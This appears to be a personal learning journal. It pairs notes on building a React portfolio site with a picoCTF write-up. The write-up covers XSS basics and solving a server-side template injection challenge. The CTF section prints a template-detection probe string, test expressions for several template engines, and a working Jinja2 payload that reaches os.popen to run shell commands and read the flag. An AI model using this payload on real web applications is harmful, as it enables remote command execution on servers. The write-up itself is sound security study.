#### Personal Project

Exporting my functions was being annoying because I was not doing it properly. I thought I could just `export function <name>`
but I had to `export default <function-name>` after the definition.

json objects in javascript are defined as follows:
```javascript
{
	'name': 'Chris',
	'age': 'old'
}
```

I was struggling through having my json object pass to my child components. Turns out I just needed to surround the parameter in {} to destructure it (I think).


So far I have added and styled the individual job experience details.

My guy, you have to someday remember that your css doesnt apply if you dont IMPORT IT

Progress for today:

- Added the work experience section
- Added a generic header
- Started on the projects section.

Todo Tomorrow:
- Finish the porjects section
- Start summary
- Start Main header
- Start Main Sub Header
- Start Skills Section

### PicoCTF

Back to reading the primer.
Now it's talking about XSS (cross site scripting) and to me this starts to really feel like the hackery kinda stuff that look so cool and sounds so cool.
Okay they mostly were talking about injecting javascript into an unesecured field and I think thats super simple.

The Primer is just not keeping my attention today so I will just try to do challenges instead.

Web Explotation
Desc: I made a cool website where you can announce whatever you want! Try it out!
There is a website that has an input that lets me type into it and it moves me to another page with that text on it. 

I tried executin g a console.log and it didnt do anythin.
The hint says "Server-side template injection" so I will look into that and see what it is.

Basically it's trying to inject code into a template to break out of it and run our code.

Apparently this `${{<%[%'"}}%\.` is useful to inject since it will tell us if there is a template to exploit
Inputting that gave me an internal server exception which means that the input is not being sanitized.

I see that it's the {{ part that is causing the internal server error
Looking at a solution showed that these are the different templating languages and how to check them:
```
Jinja2 (Python Flask/Django): {{ 7*7 }}
Freemarker (Java): ${7*7}
Velocity (Java): #set($a = 7*7)${a}
Thymeleaf (Java): ${7*7}
Twig (PHP Symfony): {{ 7*7 }}
Smarty (PHP): {$7*7}
Mako (Python): <% print 7*7 %>
```

I see that {{ 7*7 }} gives me 49 so it's a python application or a twig application
I have no idea what to look for from here. 
From here we can start injecting any python code we want so the solution showed using the whoami command so I assume I can root around the whole system this way.

`{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read()}}` lets me run cli commands and read the output in python

`{{self.
_TemplateReference__context.
cycler.
__init__.
__globals__.
os.
popen('ls').
read()}}`

I used cat flag and it output the contents of the flag file on the web app.

Once I knew that I was able to execute commands it was really easy, but it took looking at a solution to know that I *could* do that.

When injecting into jinja we aren't able to use any import statements that would easily allow us to import and then call sys or os. So instead we have to find a package that is being used that already has the import of os or sys so we can make system calls. 
And thats what the code below is doing
`{{self.
_TemplateReference__context.
cycler.
__init__.
__globals__.
`

Then its as simple as using the os package the same way we normally would.
`os.
popen('ls').
read()}}`
